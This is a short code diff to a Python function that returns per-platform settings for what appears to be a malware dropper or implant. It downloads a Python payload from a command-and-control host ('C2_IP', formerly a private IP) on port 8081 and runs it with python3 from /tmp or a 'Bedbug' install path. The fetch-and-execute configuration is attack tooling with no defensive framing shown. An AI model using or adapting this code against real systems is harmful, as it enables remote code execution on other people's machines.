@@ -12,14 +12,14 @@ def getPayload():
         return {
             "installPath": "/tmp",
             "payload": "ciao.txt",
-            "download": "http://192.168.1.21:8081/ciao.py",
+            "download": "http://C2_IP:8081/ciao.py",
             "execCommand": "python3 ciao.py",
         }
     else:
         return {
             "installPath": "C:\\Program Files\\Bedbug",
             "payload": "C:\\tmp\\ciao.py",
-            "download": "http://192.168.1.21:8081/ciao.py",
+            "download": "http://C2_IP:8081/ciao.py",
             "execCommand": "python3 C:\\tmp\\ciao.py",
         }
     return print("Payload not found")
